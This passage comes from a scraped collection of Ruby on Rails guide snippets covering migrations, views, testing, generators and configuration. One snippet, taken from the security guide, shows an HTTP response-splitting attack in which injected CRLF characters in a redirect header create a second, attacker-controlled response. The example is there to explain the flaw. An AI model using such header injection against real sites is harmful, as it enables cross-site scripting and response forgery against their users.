ActiveRecord::Migration[8.1]\n  def change\n    create_table :publications do |t|\n      t.string :title\n      t.text :description\n      t.references :publication_type\n      t.references :publisher, polymorphic: true\n      t.boolean :single_issue\n\n      t.timestamps\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Using attr_internal in ActionView::Base Ruby\nDESCRIPTION: This snippet demonstrates how `attr_internal` is used within `ActionView::Base` in Rails. It defines internal attributes for capturing content, accessing the request, layout, controller, and template, which are used internally by the view rendering process.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\nmodule ActionView\n  class Base\n    attr_internal :captures\n    attr_internal :request, :layout\n    attr_internal :controller, :template\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Pluralize String with Count\nDESCRIPTION: This snippet demonstrates using the `pluralize` method with a count parameter to get the singular or plural form based on the count.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_64\n\nLANGUAGE: ruby\nCODE:\n```\n\"dude\".pluralize(0) # => \"dudes\"\n\"dude\".pluralize(1) # => \"dude\"\n\"dude\".pluralize(2) # => \"dudes\"\n```\n\n----------------------------------------\n\nTITLE: Retrieving Associated Object via has_one - Ruby\nDESCRIPTION: Fetches the Account associated with a Supplier using has_one. Returns the associated Account object or nil if none exists. Assumes proper Rails model relationships.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_26\n\nLANGUAGE: ruby\nCODE:\n```\n@account = @supplier.account\n```\n\n----------------------------------------\n\nTITLE: Opting-out of Rails Test Transactions Ruby\nDESCRIPTION: Shows how to disable automatic transaction wrapping for individual test cases in Rails.  By setting `self.use_transactional_tests = false`, the test case will not be enclosed in a database transaction.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_34\n\nLANGUAGE: ruby\nCODE:\n```\nclass MyTest < ActiveSupport::TestCase\n  # No implicit database transaction wraps the tests in this test case.\n  self.use_transactional_tests = false\nend\n```\n\n----------------------------------------\n\nTITLE: Rendering a Partial with a Layout\nDESCRIPTION: Shows how to render a partial with a specific layout using the `layout:` option in the `render` call. The example passes an `article` local variable to both the partial and the layout.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_43\n\nLANGUAGE: html+erb\nCODE:\n```\n<%# app/views/articles/show.html.erb %>\n<%= render partial: 'article', layout: 'box', locals: { article: @article } %>\n```\n\n----------------------------------------\n\nTITLE: Configuring ActiveResource Format to XML - Ruby\nDESCRIPTION: Demonstrates setting the request serialization format for an ActiveResource model to XML instead of the new default JSON. The snippet shows how to set the class-level format configuration using `self.format`, which instructs ActiveResource to serialize API requests and parse responses as XML. This configuration is required if maintaining backward compatibility with APIs expecting XML input/output. The only parameter is the format symbol; this configuration affects all requests/responses for the model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_1_release_notes.md#2025-04-23_snippet_19\n\nLANGUAGE: Ruby\nCODE:\n```\nclass User < ActiveResource::Base\n  self.format = :xml\nend\n```\n\n----------------------------------------\n\nTITLE: Generated Nested XML Example (HTML)\nDESCRIPTION: This HTML shows the output that would be produced by the Builder block example. It demonstrates how nested XML elements are created using the block syntax.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_9\n\nLANGUAGE: HTML\nCODE:\n```\n<div>\n  <h1>David Heinemeier Hansson</h1>\n  <p>A product of Danish Design during the Winter of '79...</p>\n</div>\n```\n\n----------------------------------------\n\nTITLE: Manual Asset Inclusion Order in ERB Layout\nDESCRIPTION: An example showing how to manually control the order of CSS and JavaScript files in a Rails application layout file. This demonstrates explicit asset ordering when using Propshaft.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_1\n\nLANGUAGE: erb\nCODE:\n```\n<!-- application.html.erb -->\n<head>\n <%= stylesheet_link_tag \"reset\" %>\n <%= stylesheet_link_tag \"base\" %>\n <%= stylesheet_link_tag \"main\" %>\n</head>\n<body>\n <%= javascript_include_tag \"utilities\" %>\n <%= javascript_include_tag \"main\" %>\n</body>\n```\n\n----------------------------------------\n\nTITLE: Rendering Variant Image in Rails View (ERB)\nDESCRIPTION: Usage of image_tag to display a processed variant (e.g., thumb) of an attachment in a Rails view. Utilizes the variant method on the Active Storage association; result is a URL for the variant image. Requires user.avatar to be present and processed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_21\n\nLANGUAGE: erb\nCODE:\n```\n<%= image_tag user.avatar.variant(:thumb) %>\n```\n\n----------------------------------------\n\nTITLE: Raising an Error when a Template Variable is Missing in Rails\nDESCRIPTION: This example demonstrates that if a template refers to a variable that is not passed in via `locals:`, an `ActionView::Template::Error` is raised. In this case, `product_reviews` is not passed into the partial, causing the error.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_14\n\nLANGUAGE: html+erb\nCODE:\n```\n<%# app/views/products/_product.html.erb %>\n\n<%= tag.div id: dom_id(my_product) do %>\n  <h1><%= my_product.name %></h1>\n\n  <%# => raises ActionView::Template::Error for `product_reviews` %>\n  <% product_reviews.each do |review| %>\n    <%# ... %>\n  <% end %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Updating Rails Fork with Latest Changes\nDESCRIPTION: This bash snippet shows how to update a Rails fork with the latest changes from the official repository, including fetching, rebasing, and pushing to the fork.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_43\n\nLANGUAGE: bash\nCODE:\n```\n$ git fetch rails\n$ git checkout main\n$ git rebase rails/main\n$ git checkout my_new_branch\n$ git rebase rails/main\n$ git push fork main\n$ git push fork my_new_branch\n```\n\n----------------------------------------\n\nTITLE: HTTP Header Response Splitting Example\nDESCRIPTION: Demonstrates a response splitting attack where injected CRLF characters allow attackers to create a second malicious HTTP response, potentially enabling XSS or other attacks.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_63\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 302 Found [First standard 302 response]\nDate: Tue, 12 Apr 2005 22:09:07 GMT\nLocation:Content-Type: text/html\n\n\nHTTP/1.1 200 OK [Second New response created by attacker begins]\nContent-Type: text/html\n\n\n&lt;html&gt;&lt;font color=red&gt;hey&lt;/font&gt;&lt;/html&gt; [Arbitrary malicious input is\nKeep-Alive: timeout=15, max=100         shown as the redirected page]\nConnection: Keep-Alive\nTransfer-Encoding: chunked\nContent-Type: text/html\n```\n\n----------------------------------------\n\nTITLE: Collection Partial Layout\nDESCRIPTION: This code snippet demonstrates using the `:layout` option when rendering a collection. The `special_layout` layout will be rendered together with the `product` partial for each item in the `@products` collection.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_95\n\nLANGUAGE: erb\nCODE:\n```\n<%= render partial: \"product\", collection: @products, layout: \"special_layout\" %>\n```\n\n----------------------------------------\n\nTITLE: Extracting Text Excerpts with excerpt in Ruby\nDESCRIPTION: Demonstrates the use of excerpt helper to extract a portion of text surrounding a given phrase.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_helpers.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nexcerpt(\"This is a very beautiful morning\", \"very\", separator: \" \", radius: 1)\n# => ...a very beautiful...\n\nexcerpt(\"This is also an example\", \"an\", radius: 8, omission: \"<chop> \")\n#=> <chop> is also an example\n```\n\n----------------------------------------\n\nTITLE: Customizing Individual Basename Inflections\nDESCRIPTION: Configuration for customizing specific basename inflections independently of ActiveSupport.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\nRails.autoloaders.each do |autoloader|\n  autoloader.inflector.inflect(\n    \"html_parser\" => \"HTMLParser\",\n    \"ssl_error\"   => \"SSLError\"\n  )\nend\n```\n\n----------------------------------------\n\nTITLE: Displaying Backtrace in Rails Debugger\nDESCRIPTION: The `backtrace` command lists all frames on the stack, showing frame identifiers, call locations, and additional information. This example demonstrates the full output with multiple Rails framework frames.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\n=>#0    PostsController#index at ~/projects/rails-guide-example/app/controllers/posts_controller.rb:7\n  #1    ActionController::BasicImplicitRender#send_action(method=\"index\", args=[]) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-2.0.alpha/lib/action_controller/metal/basic_implicit_render.rb:6\n  #2    AbstractController::Base#process_action(method_name=\"index\", args=[]) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-8.1.0.alpha/lib/abstract_controller/base.rb:214\n  #3    ActionController::Rendering#process_action(#arg_rest=nil) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-8.1.0.alpha/lib/action_controller/metal/rendering.rb:53\n  #4    block in process_action at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actionpack-8.1.0.alpha/lib/abstract_controller/callbacks.rb:221\n  #5    block in run_callbacks at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activesupport-8.1.0.alpha/lib/active_support/callbacks.rb:118\n  #6    ActionText::Rendering::ClassMethods#with_renderer(renderer=#<PostsController:0x0000000000af78>) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actiontext-8.1.0.alpha/lib/action_text/rendering.rb:20\n  #7    block {|controller=#<PostsController:0x0000000000af78>, action=#<Proc:0x00007fd91985f1c0 /Users/st0012/...|} in <class:Engine> (4 levels) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/actiontext-8.1.0.alpha/lib/action_text/engine.rb:69\n  #8    [C] BasicObject#instance_exec at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activesupport-8.1.0.alpha/lib/active_support/callbacks.rb:127\n  ..... and more\n```\n\n----------------------------------------\n\nTITLE: Migrating Filter Methods to Action Methods in Rails\nDESCRIPTION: Reference table showing the mapping of deprecated *_filter methods to their new *_action equivalents. These replacements are part of Rails' move away from filter terminology.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_2_release_notes.md#2025-04-23_snippet_10\n\nLANGUAGE: text\nCODE:\n```\nafter_filter          => after_action\nappend_after_filter   => append_after_action\nappend_around_filter  => append_around_action\nappend_before_filter  => append_before_action\naround_filter         => around_action\nbefore_filter         => before_action\nprepend_after_filter  => prepend_after_action\nprepend_around_filter => prepend_around_action\nprepend_before_filter => prepend_before_action\nskip_after_filter     => skip_after_action\nskip_around_filter    => skip_around_action\nskip_before_filter    => skip_before_action\nskip_filter           => skip_action_callback\n```\n\n----------------------------------------\n\nTITLE: Configuring Rails to Use a CDN Asset Host (Ruby)\nDESCRIPTION: Rails configuration snippet used in 'config/environments/production.rb' to set a custom asset host URL for production. The 'config.asset_host' parameter is assigned a CDN host domain. Input is a string with the CDN hostname; as output, Rails template and view helpers generate URLs prefixed by the specified CDN host. This requires no protocol prefix. Useful for CDN integration in a deployment pipeline.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.asset_host = \"mycdnsubdomain.fictional-cdn.com\"\n```\n\n----------------------------------------\n\nTITLE: Pluralization Implementation\nDESCRIPTION: Shows how to implement pluralization rules for different counts in translations\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_36\n\nLANGUAGE: ruby\nCODE:\n```\nI18n.backend.store_translations :en, inbox: {\n  zero: \"no messages\", # optional\n  one: \"one message\",\n  other: \"%{count} messages\"\n}\nI18n.translate :inbox, count: 2\n```\n\n----------------------------------------\n\nTITLE: Generated CSRF Meta Tags in HTML\nDESCRIPTION: This HTML snippet shows the output of the Rails csrf_meta_tags helper method. It generates two meta tags: one defining the CSRF parameter name and another containing the actual token value used for request verification.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_17\n\nLANGUAGE: html\nCODE:\n```\n<head>\n  <meta name=\"csrf-param\" content=\"authenticity_token\" />\n  <meta name=\"csrf-token\" content=\"THE-TOKEN\" />\n</head>\n```\n\n----------------------------------------\n\nTITLE: Configuring Timezone Preservation in to_time Calls\nDESCRIPTION: Configuration for Ruby 2.4 compatibility to control whether the timezone of the receiver is preserved when calling to_time in Rails 5.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_61\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport.to_time_preserves_timezone = false\n```\n\n----------------------------------------\n\nTITLE: ActiveModel::Naming - name (IRB)\nDESCRIPTION: Demonstrates the `name` method of `model_name` from `ActiveModel::Naming`. It returns the name of the model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_23\n\nLANGUAGE: irb\nCODE:\n```\nirb> Person.model_name.name\n=> \"Person\"\n```\n\n----------------------------------------\n\nTITLE: Adding Sprockets as Optional Dependency in Gemfile - Ruby\nDESCRIPTION: Demonstrates how to explicitly add the sprockets-rails gem to your application's Gemfile since it's no longer included by default in Rails 7.0.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\ngem \"sprockets-rails\"\n```\n\n----------------------------------------\n\nTITLE: Running RuboCop for Code Linting\nDESCRIPTION: This command-line instruction executes RuboCop, a Ruby linter, to check for code style inconsistencies. The output reports any offenses detected in the codebase.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_128\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rubocop\n```\n\n----------------------------------------\n\nTITLE: Mailer Unit Test Example - Ruby\nDESCRIPTION: This Ruby code shows an example of a mailer unit test, specifically for the `invite` action of the `UserMailer`. It tests that the email is created, sent, and contains the expected content. It relies on fixtures for expected email content.  Uses assert_emails to confirm an email was sent.  Tests email attributes like from, to, and subject.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_94\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass UserMailerTest < ActionMailer::TestCase\n  test \"invite\" do\n    # Create the email and store it for further assertions\n    email = UserMailer.create_invite(\"me@example.com\",\n                                     \"friend@example.com\", Time.now)\n\n    # Send the email, then test that it got queued\n    assert_emails 1 do\n      email.deliver_now\n    end\n\n    # Test the body of the sent email contains what we expect it to\n    assert_equal [\"me@example.com\"], email.from\n    assert_equal [\"friend@example.com\"], email.to\n    assert_equal \"You have been invited by me@example.com\", email.subject\n    assert_equal read_fixture(\"invite\").join, email.body.to_s\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Finding Subclasses with subclasses\nDESCRIPTION: This Ruby code shows how to use the `subclasses` method to find all direct subclasses of a given class. The `subclasses` method returns an array of classes that directly inherit from the receiver.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_32\n\nLANGUAGE: ruby\nCODE:\n```\nclass C; end\nC.subclasses # => []\n\nclass B < C; end\nC.subclasses # => [B]\n\nclass A < B; end\nC.subclasses # => [B]\n\nclass D < C; end\nC.subclasses # => [B, D]\n```\n\n----------------------------------------\n\nTITLE: Displaying Image in Action Mailer View (ERB)\nDESCRIPTION: Shows an ERB template using the image_tag helper to embed an image in an email. The image resolution depends on config.action_mailer.asset_host being set, as mailers lack a request context for inferring URL roots.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_22\n\nLANGUAGE: html+erb\nCODE:\n```\n<%= image_tag 'image.jpg' %>\n```\n\n----------------------------------------\n\nTITLE: Declaring Horizontal Shards in Rails Database Configuration - YAML\nDESCRIPTION: This YAML snippet outlines a sample production environment with multiple primary and shard databases, including read replicas and custom migration paths. Each database is configured with an adapter, database name, and (optionally) 'migrations_paths'. Required for advanced horizontal sharding in Rails 6+.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_19\n\nLANGUAGE: yaml\nCODE:\n```\nproduction:\n  primary:\n    database: my_primary_database\n    adapter: mysql2\n  primary_replica:\n    database: my_primary_database\n    adapter: mysql2\n    replica: true\n  primary_shard_one:\n    database: my_primary_shard_one\n    adapter: mysql2\n    migrations_paths: db/migrate_shards\n  primary_shard_one_replica:\n    database: my_primary_shard_one\n    adapter: mysql2\n    replica: true\n  primary_shard_two:\n    database: my_primary_shard_two\n    adapter: mysql2\n    migrations_paths: db/migrate_shards\n  primary_shard_two_replica:\n    database: my_primary_shard_two\n    adapter: mysql2\n    replica: true\n```\n\n----------------------------------------\n\nTITLE: Wrapping Manual Threads with Rails Executor (Ruby)\nDESCRIPTION: Illustrates safe manual thread creation by ensuring each thread that runs Rails application code is wrapped with the Executor. This approach is required when using raw `Thread.new` or external concurrency libraries, to inherit correct context and resource management. The block passed to `wrap` should contain application logic. No extra dependencies are required beyond Rails and Ruby's built-in Thread support.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/threading_and_code_execution.md#2025-04-23_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\nThread.new do\n  Rails.application.executor.wrap do\n    # your code here\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Simple Layout Example\nDESCRIPTION: Provides an example of a basic application layout file (`application.html.erb`) that includes HTML structure, meta tags, stylesheets, Javascript importmap tags, navigation, and a `yield` statement for rendering view content.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_41\n\nLANGUAGE: html+erb\nCODE:\n```\n<!DOCTYPE html>\n<html>\n<head>\n  <title><%= \"Your Rails App\" %></title>\n  <%= csrf_meta_tags %>\n  <%= csp_meta_tag %>\n  <%= stylesheet_link_tag \"application\", \"data-turbo-track\": \"reload\" %>\n  <%= javascript_importmap_tags %>\n</head>\n<body>\n\n<nav>\n  <ul>\n    <li><%= link_to \"Home\", root_path %></li>\n    <li><%= link_to \"Products\", products_path %></li>\n    <!-- Additional navigation links here -->\n  </ul>\n</nav>\n\n<%= yield %>\n\n<footer>\n  <p>&copy; <%= Date.current.year %> Your Company</p>\n</footer>\n```\n\n----------------------------------------\n\nTITLE: HTML Output of File Upload Form\nDESCRIPTION: This HTML snippet represents the form generated by the file upload examples, with the crucial `enctype=\"multipart/form-data\"` attribute set.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_60\n\nLANGUAGE: html\nCODE:\n```\n<form enctype=\"multipart/form-data\" action=\"/people\" accept-charset=\"UTF-8\" method=\"post\">\n<!-- ... -->\n</form>\n```\n\n----------------------------------------\n\nTITLE: Generated HTML Form with Composite Primary Key\nDESCRIPTION: This snippet shows the generated HTML for a form targeting a resource with a composite primary key. Note the URL in the `action` attribute combines the key values separated by an underscore (e.g., `/books/2_25`).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_composite_primary_keys.md#_snippet_14\n\nLANGUAGE: html\nCODE:\n```\n<form action=\"/books/2_25\" method=\"post\" accept-charset=\"UTF-8\" >\n  <input name=\"authenticity_token\" type=\"hidden\" value=\"...\" />\n  <input type=\"text\" name=\"book[title]\" id=\"book_title\" value=\"My book\" />\n  <input type=\"submit\" name=\"commit\" value=\"Update Book\" data-disable-with=\"Update Book\">\n</form>\n```\n\n----------------------------------------\n\nTITLE: Example Output of Middleware List after Deletion - Bash\nDESCRIPTION: This Bash snippet is sample terminal output after removing a middleware (such as Rack::Runtime) using config.middleware.delete and then inspecting the stack with bin/rails middleware. It documents expected output structure for confirmation and debugging. Requires a Rails application where the stack was modified as instructed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_on_rack.md#2025-04-23_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails middleware\\n(in /Users/lifo/Rails/blog)\\nuse ActionDispatch::Static\\nuse #<ActiveSupport::Cache::Strategy::LocalCache::Middleware:0x00000001c304c8>\\n...\\nrun Rails.application.routes\n```\n\n----------------------------------------\n\nTITLE: Debugging Products in View (ERB)\nDESCRIPTION: This snippet shows how to display the `@products` instance variable in the `index.html.erb` view using the `debug` helper. It outputs the variable in YAML format, aiding in debugging.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_46\n\nLANGUAGE: erb\nCODE:\n```\n<%= debug @products %>\n```\n\n----------------------------------------\n\nTITLE: Running Rails Templates from URL\nDESCRIPTION: Commands demonstrating how to run Rails templates stored at remote URLs rather than local paths. This allows for sharing templates across multiple projects or teams.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_28\n\nLANGUAGE: bash\nCODE:\n```\n$ rails new my_cool_app -m http://example.com/template.rb\n$ bin/rails app:template LOCATION=http://example.com/template.rb\n```\n\n----------------------------------------\n\nTITLE: Removing Objects from a Has and Belongs to Many Collection in Rails\nDESCRIPTION: Example of using the delete method to remove an assembly from a part's collection of assemblies, which removes records from the join table without destroying the objects.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/association_basics.md#2025-04-23_snippet_50\n\nLANGUAGE: ruby\nCODE:\n```\n@part.assemblies.delete(@assembly1)\n```\n\n----------------------------------------\n\nTITLE: JavaScript Asset URL Transformation\nDESCRIPTION: Example of using RAILS_ASSET_URL macro in JavaScript to reference digested assets.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nexport default class extends Controller {\n  init() {\n    this.img = RAILS_ASSET_URL(\"/icons/trash.svg\");\n  }\n}\n```\n\nLANGUAGE: javascript\nCODE:\n```\nexport default class extends Controller {\n  init() {\n    this.img = \"/assets/icons/trash-54g9cbef.svg\";\n  }\n}\n```\n\nLANGUAGE: javascript\nCODE:\n```\n// app/assets/javascripts/main.js\nconsole.log(\"Hello, world!\");\n```\n\n----------------------------------------\n\nTITLE: SQL query generated by find_or_create_by in Rails\nDESCRIPTION: These SQL queries are generated by the `Customer.find_or_create_by(first_name: 'Andy')` command. First, it tries to find a customer with the first name 'Andy'. If no such customer exists, it inserts a new record into the `customers` table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_186\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM customers WHERE (customers.first_name = 'Andy') LIMIT 1\nBEGIN\nINSERT INTO customers (created_at, first_name, locked, orders_count, updated_at) VALUES ('2011-08-30 05:22:57', 'Andy', 1, NULL, '2011-08-30 05:22:57')\nCOMMIT\n```\n\n----------------------------------------\n\nTITLE: Manually Setting Direct Upload URL on File Input\nDESCRIPTION: Demonstrates how to add the direct upload URL data attribute to a file input manually when not using a FormBuilder.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_66\n\nLANGUAGE: erb\nCODE:\n```\n<input type=\"file\" data-direct-upload-url=\"<%= rails_direct_uploads_url %>\" />\n```\n\n----------------------------------------\n\nTITLE: Grouping Gems using gem_group\nDESCRIPTION: Demonstrates how to wrap gem entries inside a group using the `gem_group` method. This allows gems to be loaded only in specific environments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_application_templates.md#_snippet_4\n\nLANGUAGE: ruby\nCODE:\n```\ngem_group :development, :test do\n  gem \"rspec-rails\"\nend\n```\n\n----------------------------------------\n\nTITLE: Picking Value from First Element with pick in Ruby\nDESCRIPTION: This snippet illustrates the `pick` method which extracts the given key from the *first* element of an Enumerable. Defined in `active_support/core_ext/enumerable.rb`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_117\n\nLANGUAGE: ruby\nCODE:\n```\n[{ name: \"David\" }, { name: \"Rafael\" }, { name: \"Aaron\" }].pick(:name) # => \"David\"\n[{ id: 1, name: \"David\" }, { id: 2, name: \"Rafael\" }].pick(:id, :name) # => [1, \"David\"]\n```\n\n----------------------------------------\n\nTITLE: Stream for a Model Ruby\nDESCRIPTION: This Ruby code demonstrates streaming for a specific model instance using stream_for. It finds a Post model using the id parameter and then streams for that post, allowing broadcasts specific to that model instance.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_cable_overview.md#_snippet_14\n\nLANGUAGE: Ruby\nCODE:\n```\nclass PostsChannel < ApplicationCable::Channel\n  def subscribed\n    post = Post.find(params[:id])\n    stream_for post\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: API URL Unmodified with Release Tag - none\nDESCRIPTION: Displays an API documentation URL that includes a specific version. This snippet is referenced to clarify documented link behaviors, showing that URLs containing a version remain untouched during guide generation. No processing occurs; this is an informational example.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/ruby_on_rails_guides_guidelines.md#2025-04-23_snippet_6\n\nLANGUAGE: none\nCODE:\n```\nhttps://api.rubyonrails.org/v5.0.1/classes/ActiveRecord/Attributes/ClassMethods.html\n```\n\n----------------------------------------\n\nTITLE: Accessing Command-Line Option Values in a Rails Generator in Ruby\nDESCRIPTION: Illustrates how to access the value of a command-line option (like `--scope`) within a generator method using the `options` hash provided by Thor. The value is assigned to an instance variable `@scope`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\ndef copy_initializer_file\n  @scope = options[\"scope\"]\nend\n```\n\n----------------------------------------\n\nTITLE: Output of Default Rails Scaffold Generator using Bash\nDESCRIPTION: Shows the detailed output of running `bin/rails generate scaffold User name:string`. This output illustrates the various sub-generators invoked (like `active_record`, `test_unit`, `scaffold_controller`, `erb`, `helper`, `jbuilder`) and the files created during the standard scaffolding process.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_16\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate scaffold User name:string\n      invoke  active_record\n      create    db/migrate/20230518000000_create_users.rb\n      create    app/models/user.rb\n      invoke    test_unit\n      create      test/models/user_test.rb\n      create      test/fixtures/users.yml\n      invoke  resource_route\n       route    resources :users\n      invoke  scaffold_controller\n      create    app/controllers/users_controller.rb\n      invoke    erb\n      create      app/views/users\n      create      app/views/users/index.html.erb\n      create      app/views/users/edit.html.erb\n      create      app/views/users/show.html.erb\n      create      app/views/users/new.html.erb\n      create      app/views/users/_form.html.erb\n      create      app/views/users/_user.html.erb\n      invoke    resource_route\n      invoke    test_unit\n      create      test/controllers/users_controller_test.rb\n      create      test/system/users_test.rb\n      invoke    helper\n      create      app/helpers/users_helper.rb\n      invoke      test_unit\n      invoke    jbuilder\n      create      app/views/users/index.json.jbuilder\n      create      app/views/users/show.json.jbuilder\n```\n\n----------------------------------------\n\nTITLE: Modifying Class Method Calls with ActiveSupport.on_load in Ruby\nDESCRIPTION: This Ruby snippet illustrates how to modify calls to class methods using `ActiveSupport.on_load`. This ensures that `include_root_in_json` is set only when `ActiveRecord::Base` is loaded, preventing unnecessary loading of the Active Record framework.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_107\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport.on_load(:active_record) do\n  # self refers to ActiveRecord::Base here\n  self.include_root_in_json = true\nend\n```\n\n----------------------------------------\n\nTITLE: Generating a Custom Rails Generator using Bash\nDESCRIPTION: Demonstrates using `bin/rails generate generator rails/my_helper` to create the necessary files and directory structure for a new custom generator named `my_helper`, intended to override the built-in `helper` generator.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_17\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate generator rails/my_helper\n      create  lib/generators/rails/my_helper\n      create  lib/generators/rails/my_helper/my_helper_generator.rb\n      create  lib/generators/rails/my_helper/USAGE\n      create  lib/generators/rails/my_helper/templates\n      invoke  test_unit\n      create    test/lib/generators/rails/my_helper_generator_test.rb\n```\n\n----------------------------------------\n\nTITLE: Grouping Rake Tasks with Namespaces in Ruby\nDESCRIPTION: Shows how to organize related rake tasks using namespaces. Namespaces help organize tasks into logical groups, making them more maintainable in larger applications.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\nnamespace :db do\n  desc \"This task does nothing\"\n  task :nothing do\n    # Seriously, nothing\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Example Schema File - Ruby\nDESCRIPTION: This Ruby code shows an example of a `db/schema.rb` file generated by Rails. It represents the database schema using Ruby code, defining tables and their columns. It can be loaded to create a new database or update an existing one.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_73\n\nLANGUAGE: ruby\nCODE:\n```\nActiveRecord::Schema[8.1].define(version: 2008_09_06_171750) do\n  create_table \"authors\", force: true do |t|\n    t.string   \"name\"\n    t.datetime \"created_at\"\n    t.datetime \"updated_at\"\n  end\n\n  create_table \"products\", force: true do |t|\n    t.string   \"name\"\n    t.text     \"description\"\n    t.datetime \"created_at\"\n    t.datetime \"updated_at\"\n    t.string   \"part_number\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring Engine with Reloadable Application Classes\nDESCRIPTION: This snippet shows how to properly configure an engine to work with reloadable application classes by using the class name as a string instead of the actual class object.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_11\n\nLANGUAGE: ruby\nCODE:\n```\n# 